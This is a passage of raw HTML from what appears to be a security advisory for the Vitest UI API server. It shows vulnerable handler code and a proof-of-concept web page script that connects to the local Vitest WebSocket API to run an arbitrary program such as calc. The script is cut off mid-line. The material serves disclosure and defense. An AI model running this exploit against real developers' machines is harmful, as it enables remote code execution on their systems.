class=\"blob-code border-0 px-3 py-0 color-bg-default blob-code-inner js-file-line\">     <span class=\"pl-kos\">)</span> </td>\n        </tr>\n\n        <tr class=\"border-0\">\n          <td id=\"L71\" class=\"blob-num border-0 px-3 py-0 color-bg-default\" data-line-number=\"71\"></td>\n          <td id=\"LC71\" class=\"blob-code border-0 px-3 py-0 color-bg-default blob-code-inner js-file-line\">   <span class=\"pl-kos\">}</span> </td>\n        </tr>\n\n        <tr class=\"border-0\">\n          <td id=\"L72\" class=\"blob-num border-0 px-3 py-0 color-bg-default\" data-line-number=\"72\"></td>\n          <td id=\"LC72\" class=\"blob-code border-0 px-3 py-0 color-bg-default blob-code-inner js-file-line\">   <span class=\"pl-k\">return</span> <span class=\"pl-s1\">fs</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">writeFile</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">id</span><span class=\"pl-kos\">,</span> <span class=\"pl-s1\">content</span><span class=\"pl-kos\">,</span> <span class=\"pl-s\">'utf-8'</span><span class=\"pl-kos\">)</span> </td>\n        </tr>\n\n        <tr class=\"border-0\">\n          <td id=\"L73\" class=\"blob-num border-0 px-3 py-0 color-bg-default\" data-line-number=\"73\"></td>\n          <td id=\"LC73\" class=\"blob-code border-0 px-3 py-0 color-bg-default blob-code-inner js-file-line\"> <span class=\"pl-kos\">}</span><span class=\"pl-kos\">,</span> </td>\n        </tr>\n\n        <tr class=\"border-0\">\n          <td id=\"L74\" class=\"blob-num border-0 px-3 py-0 color-bg-default\" data-line-number=\"74\"></td>\n          <td id=\"LC74\" class=\"blob-code border-0 px-3 py-0 color-bg-default blob-code-inner js-file-line\"> <span class=\"pl-k\">async</span> <span class=\"pl-en\">rerun</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">files</span><span class=\"pl-kos\">,</span> <span class=\"pl-s1\">resetTestNamePattern</span><span class=\"pl-kos\">)</span> <span class=\"pl-kos\">{</span> </td>\n        </tr>\n\n        <tr class=\"border-0\">\n          <td id=\"L75\" class=\"blob-num border-0 px-3 py-0 color-bg-default\" data-line-number=\"75\"></td>\n          <td id=\"LC75\" class=\"blob-code border-0 px-3 py-0 color-bg-default blob-code-inner js-file-line\">   <span class=\"pl-k\">await</span> <span class=\"pl-s1\">ctx</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">rerunFiles</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">files</span><span class=\"pl-kos\">,</span> <span class=\"pl-c1\">undefined</span><span class=\"pl-kos\">,</span> <span class=\"pl-c1\">true</span><span class=\"pl-kos\">,</span> <span class=\"pl-s1\">resetTestNamePattern</span><span class=\"pl-kos\">)</span> </td>\n        </tr>\n\n        <tr class=\"border-0\">\n          <td id=\"L76\" class=\"blob-num border-0 px-3 py-0 color-bg-default\" data-line-number=\"76\"></td>\n          <td id=\"LC76\" class=\"blob-code border-0 px-3 py-0 color-bg-default blob-code-inner js-file-line\"> <span class=\"pl-kos\">}</span><span class=\"pl-kos\">,</span> </td>\n        </tr>\n    </tbody>\n</table>\n  </div>\n</div>\n<p></p>\n<h3 dir=\"auto\">PoC</h3>\n<ol dir=\"auto\">\n<li>Open Vitest UI.</li>\n<li>Access a malicious web site with the script below.</li>\n<li>If you have <code class=\"notranslate\">calc</code> executable in <code class=\"notranslate\">PATH</code> env var (you'll likely have it if you are running on Windows), that application will be executed.</li>\n</ol>\n<div class=\"highlight highlight-source-js\" dir=\"auto\"><pre class=\"notranslate\"><span class=\"pl-c\">// code from https://github.com/WebReflection/flatted</span>\n<span class=\"pl-k\">const</span> <span class=\"pl-v\">Flatted</span><span class=\"pl-c1\">=</span><span class=\"pl-k\">function</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">n</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">{</span><span class=\"pl-s\">\"use strict\"</span><span class=\"pl-kos\">;</span><span class=\"pl-k\">function</span> <span class=\"pl-en\">t</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">n</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">{</span><span class=\"pl-k\">return</span> <span class=\"pl-s1\">t</span><span class=\"pl-c1\">=</span><span class=\"pl-s\">\"function\"</span><span class=\"pl-c1\">==</span><span class=\"pl-k\">typeof</span> <span class=\"pl-v\">Symbol</span><span class=\"pl-c1\">&amp;&amp;</span><span class=\"pl-s\">\"symbol\"</span><span class=\"pl-c1\">==</span><span class=\"pl-k\">typeof</span> <span class=\"pl-v\">Symbol</span><span class=\"pl-kos\">.</span><span class=\"pl-c1\">iterator</span>?<span class=\"pl-k\">function</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">n</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">{</span><span class=\"pl-k\">return</span> <span class=\"pl-k\">typeof</span> <span class=\"pl-s1\">n</span><span class=\"pl-kos\">}</span>:<span class=\"pl-k\">function</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">n</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">{</span><span class=\"pl-k\">return</span> <span class=\"pl-s1\">n</span><span class=\"pl-c1\">&amp;&amp;</span><span class=\"pl-s\">\"function\"</span><span class=\"pl-c1\">==</span><span class=\"pl-k\">typeof</span> <span class=\"pl-v\">Symbol</span><span class=\"pl-c1\">&amp;&amp;</span><span class=\"pl-s1\">n</span><span class=\"pl-kos\">.</span><span class=\"pl-c1\">constructor</span><span class=\"pl-c1\">===</span><span class=\"pl-v\">Symbol</span><span class=\"pl-c1\">&amp;&amp;</span><span class=\"pl-s1\">n</span><span class=\"pl-c1\">!==</span><span class=\"pl-v\">Symbol</span><span class=\"pl-kos\">.</span><span class=\"pl-c1\">prototype</span>?<span class=\"pl-s\">\"symbol\"</span>:<span class=\"pl-k\">typeof</span> <span class=\"pl-s1\">n</span><span class=\"pl-kos\">}</span><span class=\"pl-kos\">,</span><span class=\"pl-en\">t</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">n</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">}</span><span class=\"pl-k\">var</span> <span class=\"pl-s1\">r</span><span class=\"pl-c1\">=</span><span class=\"pl-c1\">JSON</span><span class=\"pl-kos\">.</span><span class=\"pl-c1\">parse</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">e</span><span class=\"pl-c1\">=</span><span class=\"pl-c1\">JSON</span><span class=\"pl-kos\">.</span><span class=\"pl-c1\">stringify</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">o</span><span class=\"pl-c1\">=</span><span class=\"pl-v\">Object</span><span class=\"pl-kos\">.</span><span class=\"pl-c1\">keys</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">u</span><span class=\"pl-c1\">=</span><span class=\"pl-v\">String</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">f</span><span class=\"pl-c1\">=</span><span class=\"pl-s\">\"string\"</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">i</span><span class=\"pl-c1\">=</span><span class=\"pl-kos\">{</span><span class=\"pl-kos\">}</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">c</span><span class=\"pl-c1\">=</span><span class=\"pl-s\">\"object\"</span><span class=\"pl-kos\">,</span><span class=\"pl-en\">a</span><span class=\"pl-c1\">=</span><span class=\"pl-k\">function</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">n</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">t</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">{</span><span class=\"pl-k\">return</span> <span class=\"pl-s1\">t</span><span class=\"pl-kos\">}</span><span class=\"pl-kos\">,</span><span class=\"pl-en\">l</span><span class=\"pl-c1\">=</span><span class=\"pl-k\">function</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">n</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">{</span><span class=\"pl-k\">return</span> <span class=\"pl-s1\">n</span> <span class=\"pl-k\">instanceof</span> <span class=\"pl-s1\">u</span>?<span class=\"pl-s1\">u</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">n</span><span class=\"pl-kos\">)</span>:<span class=\"pl-s1\">n</span><span class=\"pl-kos\">}</span><span class=\"pl-kos\">,</span><span class=\"pl-en\">s</span><span class=\"pl-c1\">=</span><span class=\"pl-k\">function</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">n</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">r</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">{</span><span class=\"pl-k\">return</span> <span class=\"pl-en\">t</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">r</span><span class=\"pl-kos\">)</span><span class=\"pl-c1\">===</span><span class=\"pl-s1\">f</span>?<span class=\"pl-k\">new</span> <span class=\"pl-s1\">u</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">r</span><span class=\"pl-kos\">)</span>:<span class=\"pl-s1\">r</span><span class=\"pl-kos\">}</span><span class=\"pl-kos\">,</span><span class=\"pl-en\">y</span><span class=\"pl-c1\">=</span><span class=\"pl-k\">function</span> <span class=\"pl-s1\">n</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">r</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">e</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">f</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">a</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">{</span><span class=\"pl-k\">for</span><span class=\"pl-kos\">(</span><span class=\"pl-k\">var</span> <span class=\"pl-s1\">l</span><span class=\"pl-c1\">=</span><span class=\"pl-kos\">[</span><span class=\"pl-kos\">]</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">s</span><span class=\"pl-c1\">=</span><span class=\"pl-s1\">o</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">f</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">y</span><span class=\"pl-c1\">=</span><span class=\"pl-s1\">s</span><span class=\"pl-kos\">.</span><span class=\"pl-c1\">length</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">p</span><span class=\"pl-c1\">=</span><span class=\"pl-c1\">0</span><span class=\"pl-kos\">;</span><span class=\"pl-s1\">p</span><span class=\"pl-c1\">&lt;</span><span class=\"pl-s1\">y</span><span class=\"pl-kos\">;</span><span class=\"pl-s1\">p</span><span class=\"pl-c1\">++</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">{</span><span class=\"pl-k\">var</span> <span class=\"pl-s1\">v</span><span class=\"pl-c1\">=</span><span class=\"pl-s1\">s</span><span class=\"pl-kos\">[</span><span class=\"pl-s1\">p</span><span class=\"pl-kos\">]</span><span class=\"pl-kos\">,</span><span class=\"pl-v\">S</span><span class=\"pl-c1\">=</span><span class=\"pl-s1\">f</span><span class=\"pl-kos\">[</span><span class=\"pl-s1\">v</span><span class=\"pl-kos\">]</span><span class=\"pl-kos\">;</span><span class=\"pl-k\">if</span><span class=\"pl-kos\">(</span><span class=\"pl-v\">S</span> <span class=\"pl-k\">instanceof</span> <span class=\"pl-s1\">u</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">{</span><span class=\"pl-k\">var</span> <span class=\"pl-s1\">b</span><span class=\"pl-c1\">=</span><span class=\"pl-s1\">r</span><span class=\"pl-kos\">[</span><span class=\"pl-v\">S</span><span class=\"pl-kos\">]</span><span class=\"pl-kos\">;</span><span class=\"pl-en\">t</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">b</span><span class=\"pl-kos\">)</span><span class=\"pl-c1\">!==</span><span class=\"pl-s1\">c</span><span class=\"pl-c1\">||</span><span class=\"pl-s1\">e</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">has</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">b</span><span class=\"pl-kos\">)</span>?<span class=\"pl-s1\">f</span><span class=\"pl-kos\">[</span><span class=\"pl-s1\">v</span><span class=\"pl-kos\">]</span><span class=\"pl-c1\">=</span><span class=\"pl-s1\">a</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">call</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">f</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">v</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">b</span><span class=\"pl-kos\">)</span>:<span class=\"pl-kos\">(</span><span class=\"pl-s1\">e</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">add</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">b</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">f</span><span class=\"pl-kos\">[</span><span class=\"pl-s1\">v</span><span class=\"pl-kos\">]</span><span class=\"pl-c1\">=</span><span class=\"pl-s1\">i</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">l</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">push</span><span class=\"pl-kos\">(</span><span class=\"pl-kos\">{</span><span class=\"pl-c1\">k</span>:<span class=\"pl-s1\">v</span><span class=\"pl-kos\">,</span><span class=\"pl-c1\">a</span>:<span class=\"pl-kos\">[</span><span class=\"pl-s1\">r</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">e</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">b</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">a</span><span class=\"pl-kos\">]</span><span class=\"pl-kos\">}</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">}</span><span class=\"pl-k\">else</span> <span class=\"pl-s1\">f</span><span class=\"pl-kos\">[</span><span class=\"pl-s1\">v</span><span class=\"pl-kos\">]</span><span class=\"pl-c1\">!==</span><span class=\"pl-s1\">i</span><span class=\"pl-c1\">&amp;&amp;</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">f</span><span class=\"pl-kos\">[</span><span class=\"pl-s1\">v</span><span class=\"pl-kos\">]</span><span class=\"pl-c1\">=</span><span class=\"pl-s1\">a</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">call</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">f</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">v</span><span class=\"pl-kos\">,</span><span class=\"pl-v\">S</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">}</span><span class=\"pl-k\">for</span><span class=\"pl-kos\">(</span><span class=\"pl-k\">var</span> <span class=\"pl-s1\">m</span><span class=\"pl-c1\">=</span><span class=\"pl-s1\">l</span><span class=\"pl-kos\">.</span><span class=\"pl-c1\">length</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">g</span><span class=\"pl-c1\">=</span><span class=\"pl-c1\">0</span><span class=\"pl-kos\">;</span><span class=\"pl-s1\">g</span><span class=\"pl-c1\">&lt;</span><span class=\"pl-s1\">m</span><span class=\"pl-kos\">;</span><span class=\"pl-s1\">g</span><span class=\"pl-c1\">++</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">{</span><span class=\"pl-k\">var</span> <span class=\"pl-s1\">h</span><span class=\"pl-c1\">=</span><span class=\"pl-s1\">l</span><span class=\"pl-kos\">[</span><span class=\"pl-s1\">g</span><span class=\"pl-kos\">]</span><span class=\"pl-kos\">,</span><span class=\"pl-v\">O</span><span class=\"pl-c1\">=</span><span class=\"pl-s1\">h</span><span class=\"pl-kos\">.</span><span class=\"pl-c1\">k</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">d</span><span class=\"pl-c1\">=</span><span class=\"pl-s1\">h</span><span class=\"pl-kos\">.</span><span class=\"pl-c1\">a</span><span class=\"pl-kos\">;</span><span class=\"pl-s1\">f</span><span class=\"pl-kos\">[</span><span class=\"pl-v\">O</span><span class=\"pl-kos\">]</span><span class=\"pl-c1\">=</span><span class=\"pl-s1\">a</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">call</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">f</span><span class=\"pl-kos\">,</span><span class=\"pl-v\">O</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">n</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">apply</span><span class=\"pl-kos\">(</span><span class=\"pl-c1\">null</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">d</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">}</span><span class=\"pl-k\">return</span> <span class=\"pl-s1\">f</span><span class=\"pl-kos\">}</span><span class=\"pl-kos\">,</span><span class=\"pl-en\">p</span><span class=\"pl-c1\">=</span><span class=\"pl-k\">function</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">n</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">t</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">r</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">{</span><span class=\"pl-k\">var</span> <span class=\"pl-s1\">e</span><span class=\"pl-c1\">=</span><span class=\"pl-s1\">u</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">t</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">push</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">r</span><span class=\"pl-kos\">)</span><span class=\"pl-c1\">-</span><span class=\"pl-c1\">1</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">;</span><span class=\"pl-k\">return</span> <span class=\"pl-s1\">n</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">set</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">r</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">e</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">e</span><span class=\"pl-kos\">}</span><span class=\"pl-kos\">,</span><span class=\"pl-en\">v</span><span class=\"pl-c1\">=</span><span class=\"pl-k\">function</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">n</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">e</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">{</span><span class=\"pl-k\">var</span> <span class=\"pl-s1\">o</span><span class=\"pl-c1\">=</span><span class=\"pl-s1\">r</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">n</span><span class=\"pl-kos\">,</span><span class=\"pl-en\">s</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">map</span><span class=\"pl-kos\">(</span><span class=\"pl-en\">l</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">u</span><span class=\"pl-c1\">=</span><span class=\"pl-s1\">o</span><span class=\"pl-kos\">[</span><span class=\"pl-c1\">0</span><span class=\"pl-kos\">]</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">f</span><span class=\"pl-c1\">=</span><span class=\"pl-s1\">e</span><span class=\"pl-c1\">||</span><span class=\"pl-en\">a</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">i</span><span class=\"pl-c1\">=</span><span class=\"pl-en\">t</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">u</span><span class=\"pl-kos\">)</span><span class=\"pl-c1\">===</span><span class=\"pl-s1\">c</span><span class=\"pl-c1\">&amp;&amp;</span><span class=\"pl-s1\">u</span>?<span class=\"pl-en\">y</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">o</span><span class=\"pl-kos\">,</span><span class=\"pl-k\">new</span> <span class=\"pl-v\">Set</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">u</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">f</span><span class=\"pl-kos\">)</span>:<span class=\"pl-s1\">u</span><span class=\"pl-kos\">;</span><span class=\"pl-k\">return</span> <span class=\"pl-s1\">f</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">call</span><span class=\"pl-kos\">(</span><span class=\"pl-kos\">{</span><span class=\"pl-s\">\"\"</span>:<span class=\"pl-s1\">i</span><span class=\"pl-kos\">}</span><span class=\"pl-kos\">,</span><span class=\"pl-s\">\"\"</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">i</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">}</span><span class=\"pl-kos\">,</span><span class=\"pl-v\">S</span><span class=\"pl-c1\">=</span><span class=\"pl-k\">function</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">n</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">r</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">o</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">{</span><span class=\"pl-k\">for</span><span class=\"pl-kos\">(</span><span class=\"pl-k\">var</span> <span class=\"pl-s1\">u</span><span class=\"pl-c1\">=</span><span class=\"pl-s1\">r</span><span class=\"pl-c1\">&amp;&amp;</span><span class=\"pl-en\">t</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">r</span><span class=\"pl-kos\">)</span><span class=\"pl-c1\">===</span><span class=\"pl-s1\">c</span>?<span class=\"pl-k\">function</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">n</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">t</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">{</span><span class=\"pl-k\">return</span><span class=\"pl-s\">\"\"</span><span class=\"pl-c1\">===</span><span class=\"pl-s1\">n</span><span class=\"pl-c1\">||</span><span class=\"pl-c1\">-</span><span class=\"pl-c1\">1</span><span class=\"pl-c1\">&lt;</span><span class=\"pl-s1\">r</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">indexOf</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">n</span><span class=\"pl-kos\">)</span>?<span class=\"pl-s1\">t</span>:<span class=\"pl-k\">void</span> <span class=\"pl-c1\">0</span><span class=\"pl-kos\">}</span>:<span class=\"pl-s1\">r</span><span class=\"pl-c1\">||</span><span class=\"pl-en\">a</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">i</span><span class=\"pl-c1\">=</span><span class=\"pl-k\">new</span> <span class=\"pl-v\">Map</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">l</span><span class=\"pl-c1\">=</span><span class=\"pl-kos\">[</span><span class=\"pl-kos\">]</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">s</span><span class=\"pl-c1\">=</span><span class=\"pl-kos\">[</span><span class=\"pl-kos\">]</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">y</span><span class=\"pl-c1\">=</span><span class=\"pl-c1\">+</span><span class=\"pl-en\">p</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">i</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">l</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">u</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">call</span><span class=\"pl-kos\">(</span><span class=\"pl-kos\">{</span><span class=\"pl-s\">\"\"</span>:<span class=\"pl-s1\">n</span><span class=\"pl-kos\">}</span><span class=\"pl-kos\">,</span><span class=\"pl-s\">\"\"</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">n</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">v</span><span class=\"pl-c1\">=</span><span class=\"pl-c1\">!</span><span class=\"pl-s1\">y</span><span class=\"pl-kos\">;</span><span class=\"pl-s1\">y</span><span class=\"pl-c1\">&lt;</span><span class=\"pl-s1\">l</span><span class=\"pl-kos\">.</span><span class=\"pl-c1\">length</span><span class=\"pl-kos\">;</span><span class=\"pl-kos\">)</span><span class=\"pl-s1\">v</span><span class=\"pl-c1\">=</span><span class=\"pl-c1\">!</span><span class=\"pl-c1\">0</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">s</span><span class=\"pl-kos\">[</span><span class=\"pl-s1\">y</span><span class=\"pl-kos\">]</span><span class=\"pl-c1\">=</span><span class=\"pl-s1\">e</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">l</span><span class=\"pl-kos\">[</span><span class=\"pl-s1\">y</span><span class=\"pl-c1\">++</span><span class=\"pl-kos\">]</span><span class=\"pl-kos\">,</span><span class=\"pl-v\">S</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">o</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">;</span><span class=\"pl-k\">return</span><span class=\"pl-s\">\"[\"</span><span class=\"pl-c1\">+</span><span class=\"pl-s1\">s</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">join</span><span class=\"pl-kos\">(</span><span class=\"pl-s\">\",\"</span><span class=\"pl-kos\">)</span><span class=\"pl-c1\">+</span><span class=\"pl-s\">\"]\"</span><span class=\"pl-kos\">;</span><span class=\"pl-k\">function</span> <span class=\"pl-v\">S</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">n</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">r</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">{</span><span class=\"pl-k\">if</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">v</span><span class=\"pl-kos\">)</span><span class=\"pl-k\">return</span> <span class=\"pl-s1\">v</span><span class=\"pl-c1\">=</span><span class=\"pl-c1\">!</span><span class=\"pl-s1\">v</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">r</span><span class=\"pl-kos\">;</span><span class=\"pl-k\">var</span> <span class=\"pl-s1\">e</span><span class=\"pl-c1\">=</span><span class=\"pl-s1\">u</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">call</span><span class=\"pl-kos\">(</span><span class=\"pl-smi\">this</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">n</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">r</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">;</span><span class=\"pl-k\">switch</span><span class=\"pl-kos\">(</span><span class=\"pl-en\">t</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">e</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">{</span><span class=\"pl-k\">case</span> <span class=\"pl-s1\">c</span>:<span class=\"pl-k\">if</span><span class=\"pl-kos\">(</span><span class=\"pl-c1\">null</span><span class=\"pl-c1\">===</span><span class=\"pl-s1\">e</span><span class=\"pl-kos\">)</span><span class=\"pl-k\">return</span> <span class=\"pl-s1\">e</span><span class=\"pl-kos\">;</span><span class=\"pl-k\">case</span> <span class=\"pl-s1\">f</span>:<span class=\"pl-k\">return</span> <span class=\"pl-s1\">i</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">get</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">e</span><span class=\"pl-kos\">)</span><span class=\"pl-c1\">||</span><span class=\"pl-en\">p</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">i</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">l</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">e</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">}</span><span class=\"pl-k\">return</span> <span class=\"pl-s1\">e</span><span class=\"pl-kos\">}</span><span class=\"pl-kos\">}</span><span class=\"pl-kos\">;</span><span class=\"pl-k\">return</span> <span class=\"pl-s1\">n</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">fromJSON</span><span class=\"pl-c1\">=</span><span class=\"pl-k\">function</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">n</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">{</span><span class=\"pl-k\">return</span> <span class=\"pl-en\">v</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">e</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">n</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">}</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">n</span><span class=\"pl-kos\">.</span><span class=\"pl-c1\">parse</span><span class=\"pl-c1\">=</span><span class=\"pl-en\">v</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">n</span><span class=\"pl-kos\">.</span><span class=\"pl-c1\">stringify</span><span class=\"pl-c1\">=</span><span class=\"pl-v\">S</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">n</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">toJSON</span><span class=\"pl-c1\">=</span><span class=\"pl-k\">function</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">n</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">{</span><span class=\"pl-k\">return</span> <span class=\"pl-s1\">r</span><span class=\"pl-kos\">(</span><span class=\"pl-v\">S</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">n</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">}</span><span class=\"pl-kos\">,</span><span class=\"pl-s1\">n</span><span class=\"pl-kos\">}</span><span class=\"pl-kos\">(</span><span class=\"pl-kos\">{</span><span class=\"pl-kos\">}</span><span class=\"pl-kos\">)</span><span class=\"pl-kos\">;</span>\n\n<span class=\"pl-c\">// actual code to run</span>\n<span class=\"pl-k\">const</span> <span class=\"pl-s1\">ws</span> <span class=\"pl-c1\">=</span> <span class=\"pl-k\">new</span> <span class=\"pl-v\">WebSocket</span><span class=\"pl-kos\">(</span><span class=\"pl-s\">'ws://localhost:51204/__vitest_api__'</span><span class=\"pl-kos\">)</span>\n<span class=\"pl-s1\">ws</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">addEventListener</span><span class=\"pl-kos\">(</span><span class=\"pl-s\">'message'</span><span class=\"pl-kos\">,</span> <span class=\"pl-s1\">e</span> <span class=\"pl-c1\">=&gt;</span> <span class=\"pl-kos\">{</span>\n    <span class=\"pl-smi\">console</span><span class=\"pl-kos\">.</span><span class=\"pl-en\">log</span><span class=\"pl-kos\">(</span><span class=\"pl-s1\">e</span><span class=\"pl-kos\">.</span><span 